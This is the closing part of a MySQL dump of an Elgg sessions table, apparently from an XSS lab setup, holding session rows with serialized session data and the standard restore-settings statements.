INSERT INTO `elgg_xssusers_sessions` VALUES ('avftksabk7062ahj0qugpkplt2',1501099509,'_sf2_attributes|a:1:{s:4:\"guid\";i:36;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501099509;s:1:\"c\";i:1501099509;s:1:\"l\";s:1:\"0\";}'),('8jjojkfu03oa9emubl2d0acbi6',1501099712,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"AW93iplndiHXbgtnq-HtP-\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:36;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501099711;s:1:\"c\";i:1501099519;s:1:\"l\";s:1:\"0\";}'),('ggippagn8lljss82rprppkvof2',1501100954,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"jy-IY85sc5tUdbikrjMG4M\";s:4:\"guid\";i:36;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501100954;s:1:\"c\";i:1501100942;s:1:\"l\";s:1:\"0\";}'),('287rtm93econvhsp43jecsehg4',1501099749,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"Lp02ksNJ0oq7j3zZgVfn9Z\";s:3:\"msg\";a:0:{}}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501099749;s:1:\"c\";i:1501099749;s:1:\"l\";s:1:\"0\";}'),('ebmnen3s9jfadrecv6i4tmp441',1501101271,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"EqxDHkqfA1jLHo2L1sGbmn\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:44;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501101271;s:1:\"c\";i:1501101065;s:1:\"l\";s:1:\"0\";}'),('k1ekuk1ho2r4ol57ph1oq1f4o6',1515966468,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"BwxelYKE51wsVJRLJuJLDE\";s:4:\"guid\";i:44;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1515966468;s:1:\"c\";i:1515966315;s:1:\"l\";s:1:\"0\";}'),('dkdq7eu7o5jn7fk1t4v1oena41',1501101334,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"4YhMNVnytaRArjClhn8NhJ\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:45;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501101334;s:1:\"c\";i:1501101324;s:1:\"l\";s:1:\"0\";}'),('r6brgh7ctg8f1cd2mufrng4a97',1501101366,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"lTm0xuzIwWD4vs5cgZzr2V\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:46;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501101366;s:1:\"c\";i:1501101358;s:1:\"l\";s:1:\"0\";}'),('t6nu3jhnhb3a6iro340809t077',1501101399,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"GLQk2OnBm4by7HYHKDbIbt\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:47;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501101399;s:1:\"c\";i:1501101393;s:1:\"l\";s:1:\"0\";}'),('9f7n6uuha9qcede8c4okotcr41',1501101423,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"pRrNK_J0iu3S4urPu80k5s\";s:3:\"msg\";a:0:{}}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1501101423;s:1:\"c\";i:1501101423;s:1:\"l\";s:1:\"0\";}'),('6s4s540c6sc78m5pse2orum1l0',1515966489,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"8nU_OCSDSGVNx1NKvbRoWM\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:45;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1515966489;s:1:\"c\";i:1515966483;s:1:\"l\";s:1:\"0\";}'),('pab64ucfnlvt21arqt0f7o2204',1515966508,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"u8AGCxK7Pkc9IEgflZFwVW\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:46;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1515966508;s:1:\"c\";i:1515966499;s:1:\"l\";s:1:\"0\";}'),('cb8t7jl6ip6fpurait9g3sk1v0',1515966524,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"YaWhy404PfvXrw1B5QPhHh\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:47;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1515966524;s:1:\"c\";i:1515966518;s:1:\"l\";s:1:\"0\";}'),('ob12353vnodqpguhv85nl76ds3',1515966544,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"IRoLPPt_mXGKOPp_sX5FPt\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:47;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1515966544;s:1:\"c\";i:1515966533;s:1:\"l\";s:1:\"0\";}'),('75huautfusjd7o48gpiodfkl53',1515968333,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"sttvqA86_B5b1muyhh5iax\";s:3:\"msg\";a:0:{}}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1515968333;s:1:\"c\";i:1515966554;s:1:\"l\";s:1:\"0\";}'),('f63jdacpke6b88skldmaepr6s3',1523305491,'_sf2_attributes|a:1:{s:14:\"__elgg_session\";s:22:\"BxtIOAWNY32-yP8LzHa4ex\";}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1523305491;s:1:\"c\";i:1523305490;s:1:\"l\";s:1:\"0\";}'),('32a3b3i5bpkps7ihhkrh4svv07',1549469396,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"VTyMNaAhv_VI2W5Q57wnhh\";s:4:\"guid\";i:36;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1549469396;s:1:\"c\";i:1549469386;s:1:\"l\";s:1:\"0\";}'),('0vrajh2pld7606keip2aoanhb1',1549469408,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"KIvrfrKkfzXNBWQvoLyScu\";s:3:\"msg\";a:0:{}}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1549469408;s:1:\"c\";i:1549469408;s:1:\"l\";s:1:\"0\";}'),('utps7cjc5ek54ugn60b85c98n4',1718890361,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"dxLGEktZeI8COSjMX7t9XM\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:36;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1718890360;s:1:\"c\";i:1718890327;s:1:\"l\";s:1:\"0\";}'),('j243i3gsbv3p382agqum0l0bo4',1718890497,'_sf2_attributes|a:3:{s:14:\"__elgg_session\";s:22:\"Jy9rEFquctSFo6nbIRG7qP\";s:3:\"msg\";a:0:{}s:4:\"guid\";i:47;}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1718890497;s:1:\"c\";i:1718890471;s:1:\"l\";s:1:\"0\";}'),('m6fqniuiqqhlc48s80onshkcj6',1718890597,'_sf2_attributes|a:2:{s:14:\"__elgg_session\";s:22:\"gBupM8Eb6Bkgw4k39YYrTJ\";s:3:\"msg\";a:0:{}}_sf2_flashes|a:0:{}_sf2_meta|a:3:{s:1:\"u\";i:1718890597;s:1:\"c\";i:1718890597;s:1:\"l\";s:1:\"0\";}');
/*!40000 ALTER TABLE `elgg_xssusers_sessions` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-06-20  9:36:57
